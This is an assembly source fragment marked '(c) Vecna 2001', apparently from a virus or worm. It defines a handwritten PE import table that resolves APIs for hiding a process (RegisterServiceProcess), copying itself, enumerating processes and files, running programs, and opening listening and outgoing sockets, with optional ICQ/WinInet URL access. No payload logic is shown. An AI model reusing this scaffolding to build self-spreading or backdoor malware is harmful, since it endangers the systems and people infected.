;(c) Vecna 2001

import dd 0
       dd 0
       dd -1
       dd dll001+RVA_diff
       dd api001+RVA_diff

       dd 0
       dd 0
       dd -1
       dd dll002+RVA_diff
       dd api002+RVA_diff

       dd 0
       dd 0
       dd -1
       dd dll003+RVA_diff
       dd api003+RVA_diff

       dd 0
       dd 0
       dd -1
       dd dll004+RVA_diff
       dd api004+RVA_diff

       dd 0
       dd 0
       dd -1
       dd dll005+RVA_diff
       dd api005+RVA_diff

main_socket   equ $
no_socks      equ main_socket-4+run_RVA
main_sockaddr equ main_socket+4+run_RVA

       times 5 dd 0                ;NULL DLL ENTRY


dll001 db "KERNEL32",0

dll002 db "ADVAPI32",0

dll003 db "WININET",0

dll004 db "WSOCK32",0

dll005 db "USER32",0

api001 dd api101+RVA_diff
       dd api102+RVA_diff
       dd api103+RVA_diff
       dd api104+RVA_diff
       dd api105+RVA_diff
       dd api106+RVA_diff
       dd api107+RVA_diff
       dd api108+RVA_diff
       dd api109+RVA_diff
       dd api110+RVA_diff
       dd api111+RVA_diff
       dd api112+RVA_diff
       dd api113+RVA_diff
       dd api114+RVA_diff
       dd api115+RVA_diff
       dd api116+RVA_diff
       dd api117+RVA_diff
       dd 0

api002 dd api201+RVA_diff
       dd api202+RVA_diff
       dd api203+RVA_diff
       dd 0

api003 dd api301+RVA_diff
%ifdef ICQ
       dd api302+RVA_diff
       dd api303+RVA_diff
       dd api304+RVA_diff
%endif
       dd 0

api004 dd api401+RVA_diff
       dd api402+RVA_diff
       dd api403+RVA_diff
       dd api404+RVA_diff
       dd api405+RVA_diff
       dd api406+RVA_diff
       dd api407+RVA_diff
       dd api408+RVA_diff
       dd api409+RVA_diff
       dd api410+RVA_diff
       dd api411+RVA_diff
       dd 0

api005 dd api501+RVA_diff
       dw 0                    ;dd 0

api101 dw 0
       db "ExitProcess",0
api102 dw 0
       db "GetModuleFileNameA",0
api103 dw 0
       db "CopyFileA",0
api104 dw 0
       db "Process32First",0
api105 dw 0
       db "Process32Next",0
api106 dw 0
       db "FindFirstFileA",0
api107 dw 0
       db "FindNextFileA",0
api108 dw 0
       db "RegisterServiceProcess",0
api109 dw 0
       db "WinExec",0
api110 dw 0
       db "Sleep",0
api111 dw 0
       db "GetTickCount",0
api112 dw 0
       db "CreateThread",0
api113 dw 0
       db "TerminateThread",0
api114 dw 0
       db "GlobalAlloc",0
api115 dw 0
       db "GlobalFree",0
api116 dw 0
       db "SetErrorMode",0
api117 dw 0
       db "SetFileAttributesA",0

api201 dw 0
       db "RegOpenKeyExA",0
api202 dw 0
       db "RegCloseKey",0
api203 dw 0
       db "RegQueryValueExA",0

api301 dw 0
       db "InternetGetConnectedState",0
%ifdef ICQ
api302 dw 0
       db "InternetOpenA",0
api303 dw 0
       db "InternetCloseHandle",0
api304 dw 0
       db "InternetOpenUrlA",0
%endif

api401 dw 0
       db "socket",0
api402 dw 0
       db "connect",0
api403 dw 0
       db "bind",0
api404 dw 0
       db "listen",0
api405 dw 0
       db "accept",0
api406 dw 0
       db "send",0
api407 dw 0
       db "recv",0
api408 dw 0
       db "closesocket",0
api409 dw 0
       db "select",0
api410 dw 0
       db "WSAStartup",0
api411 dw 0
       db "WSACleanup",0

api501 dw 0
       db "PeekMessageA",0


ExitProcess            equ api001+imagebase+RVA_diff
GetModuleFileNameA     equ api001+imagebase+RVA_diff+4
CopyFileA              equ api001+imagebase+RVA_diff+8
Process32First         equ api001+imagebase+RVA_diff+12
Process32Next          equ api001+imagebase+RVA_diff+16
FindFirstFileA         equ api001+imagebase+RVA_diff+20
FindNextFileA          equ api001+imagebase+RVA_diff+24
RegisterServiceProcess equ api001+imagebase+RVA_diff+28
WinExec                equ api001+imagebase+RVA_diff+32
Sleep                  equ api001+imagebase+RVA_diff+36
GetTickCount           equ api001+imagebase+RVA_diff+40
CreateThread           equ api001+imagebase+RVA_diff+44
TerminateThread        equ api001+imagebase+RVA_diff+48
GlobalAlloc            equ api001+imagebase+RVA_diff+52
GlobalFree             equ api001+imagebase+RVA_diff+56
SetErrorMode           equ api001+imagebase+RVA_diff+60
SetFileAttributesA     equ api001+imagebase+RVA_diff+64

RegOpenKeyExA    equ api002+imagebase+RVA_diff
RegCloseKey      equ api002+imagebase+RVA_diff+4
RegQueryValueExA equ api002+imagebase+RVA_diff+8

InternetGetConnectedState equ api003+imagebase+RVA_diff
%ifdef ICQ
InternetOpenA             equ api003+imagebase+RVA_diff+4
InternetCloseHandle       equ api003+imagebase+RVA_diff+8
InternetOpenUrlA          equ api003+imagebase+RVA_diff+12
%endif

socket      equ api004+imagebase+RVA_diff
connect     equ api004+imagebase+RVA_diff+4
bind        equ api004+imagebase+RVA_diff+8
listen      equ api004+imagebase+RVA_diff+12
accept      equ api004+imagebase+RVA_diff+16
send        equ api004+imagebase+RVA_diff+20
recv        equ api004+imagebase+RVA_diff+24
closesocket equ api004+imagebase+RVA_diff+28
select      equ api004+imagebase+RVA_diff+32
WSAStartup  equ api004+imagebase+RVA_diff+36
WSACleanup  equ api004+imagebase+RVA_diff+40

PeekMessageA equ api005+imagebase+RVA_diff

